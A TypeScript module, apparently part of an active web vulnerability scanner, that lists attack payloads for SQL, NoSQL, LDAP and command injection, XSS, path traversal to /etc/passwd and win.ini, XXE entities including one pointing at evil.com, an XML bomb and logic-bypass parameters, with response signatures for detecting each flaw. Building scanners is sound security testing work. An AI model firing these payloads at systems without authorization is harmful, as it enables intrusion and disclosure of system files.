/**
 * Attack vectors for active scanning
 */

/**
 * SQL Injection payloads
 */
export const SQL_INJECTION_PAYLOADS = [
  // Classic SQLi
  "' OR '1'='1",
  "' OR '1'='1' --",
  "' OR '1'='1' /*",
  "admin' --",
  "admin' #",
  "' OR 1=1--",
  "') OR ('1'='1",

  // Union-based
  "' UNION SELECT NULL--",
  "' UNION SELECT NULL,NULL--",
  "' UNION ALL SELECT NULL--",

  // Boolean-based
  "' AND '1'='1",
  "' AND '1'='2",

  // Time-based
  "'; WAITFOR DELAY '0:0:5'--",
  "'; SELECT SLEEP(5)--",

  // Error-based
  "' AND 1=CONVERT(int, (SELECT @@version))--",

  // String terminators
  '"',
  "'",
  "';",
  '";',

  // SQLite Specific
  "' OR sqlite_version()=sqlite_version()--",
  "' OR randomblob(1000)--",
  "' UNION SELECT 1,sqlite_version(),3--",
  "' OR 1=1 LIMIT 1 OFFSET 1--",
];

/**
 * XSS (Cross-Site Scripting) payloads
 */
export const XSS_PAYLOADS = [
  // Basic
  "<script>alert('XSS')</script>",
  '<script>alert(1)</script>',
  "<img src=x onerror=alert('XSS')>",
  "<svg/onload=alert('XSS')>",

  // Event handlers
  '" onmouseover="alert(\'XSS\')"',
  "' onmouseover='alert(\"XSS\")'",
  "<body onload=alert('XSS')>",
  "<input onfocus=alert('XSS') autofocus>",

  // HTML5
  "<video src=x onerror=alert('XSS')>",
  "<audio src=x onerror=alert('XSS')>",

  // JavaScript protocol
  "javascript:alert('XSS')",
  "jAvAsCrIpT:alert('XSS')",

  // Data URI
  "data:text/html,<script>alert('XSS')</script>",

  // Encoded
  "%3Cscript%3Ealert('XSS')%3C/script%3E",
  "&#60;script&#62;alert('XSS')&#60;/script&#62;",
];

/**
 * Command Injection payloads
 */
export const COMMAND_INJECTION_PAYLOADS = [
  // Unix
  '; ls',
  '| ls',
  '& ls',
  '&& ls',
  '|| ls',
  '`ls`',
  '$(ls)',

  // Windows
  '& dir',
  '&& dir',
  '| dir',

  // Time-based detection
  '; sleep 5',
  '| sleep 5',
  '& ping -c 5 127.0.0.1',

  // Command terminators
  ';',
  '|',
  '&',
  '\n',
];

/**
 * Path Traversal payloads
 */
export const PATH_TRAVERSAL_PAYLOADS = [
  '../',
  '..\\',
  '../../',
  '..\\..\\',
  '../../../',
  '..\\..\\..\\',
  '....//',
  '....\\\\',

  // URL encoded
  '%2e%2e%2f',
  '%2e%2e/',
  '..%2f',
  '%2e%2e%5c',

  // Unicode
  '..%c0%af',
  '..%c1%9c',

  // Common targets
  '../etc/passwd',
  '..\\..\\..\\windows\\win.ini',
  '/etc/passwd',
  'C:\\windows\\win.ini',
];

/**
 * LDAP Injection payloads
 */
export const LDAP_INJECTION_PAYLOADS = [
  '*',
  '*)(&',
  '*)(objectClass=*',
  'admin*',
  '*)(uid=*))(|(uid=*',
];

/**
 * XML Injection payloads
 */
export const XML_INJECTION_PAYLOADS = [
  // XXE
  '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
  '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/evil">]><foo>&xxe;</foo>',

  // XML bomb
  '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;">]><lolz>&lol2;</lolz>',
];

/**
 * NoSQL Injection payloads
 */
export const NOSQL_INJECTION_PAYLOADS = [
  '[$ne]',
  '[$gt]',
  '[$regex]',
  "' || 'a'=='a",
  "{$gt: ''}",
  '{$ne: null}',
];

/**
 * Special characters for fuzzing
 */
export const SPECIAL_CHARACTERS = [
  '!@#$%^&*()',
  '<>?:"{}_+',
  '\x00', // Null byte
  '\x0a', // Newline
  '\x0d', // Carriage return
  '\x1b', // Escape
];

/**
 * Long strings for buffer overflow detection
 */
export const LONG_STRING_PAYLOADS = ['A'.repeat(1000), 'A'.repeat(10000), 'A'.repeat(100000)];

/**
 * Attack vector metadata
 */
export interface AttackVectorMetadata {
  payloads: string[];
  category: string;
  description: string;
  detectionSignatures?: string[];
}

export const ATTACK_VECTOR_MAP: AttackVectorMetadata[] = [
  {
    payloads: SQL_INJECTION_PAYLOADS,
    category: 'SQL Injection',
    description: 'SQL injection attack vectors',
    detectionSignatures: [
      'SQL syntax',
      'mysql_fetch',
      'ORA-',
      'PostgreSQL',
      'Microsoft SQL',
      'ODBC',
    ],
  },
  {
    payloads: XSS_PAYLOADS,
    category: 'XSS',
    description: 'Cross-site scripting attack vectors',
    detectionSignatures: ['<script', 'onerror=', 'onload=', 'alert('],
  },
  {
    payloads: COMMAND_INJECTION_PAYLOADS,
    category: 'Command Injection',
    description: 'OS command injection vectors',
    detectionSignatures: ['sh:', 'bash:', 'command not found'],
  },
  {
    payloads: PATH_TRAVERSAL_PAYLOADS,
    category: 'Path Traversal',
    description: 'Directory traversal attack vectors',
    detectionSignatures: ['root:', 'win.ini', '[extensions]'],
  },
  {
    payloads: NOSQL_INJECTION_PAYLOADS,
    category: 'NoSQL Injection',
    description: 'NoSQL injection attack vectors',
  },
];

/**
 * Logic Bypass / Configuration Manipulation
 */
export const LOGIC_BYPASS_PAYLOADS = [
  'security_level=0',
  'admin=1',
  'debug=true',
  'role=admin',
  'test=1',
];

/**
 * Get all payloads
 */
export const ALL_PAYLOADS = [
  ...SQL_INJECTION_PAYLOADS,
  ...XSS_PAYLOADS,
  ...COMMAND_INJECTION_PAYLOADS,
  ...PATH_TRAVERSAL_PAYLOADS,
  ...LDAP_INJECTION_PAYLOADS,
  ...NOSQL_INJECTION_PAYLOADS,
  ...LOGIC_BYPASS_PAYLOADS,
];
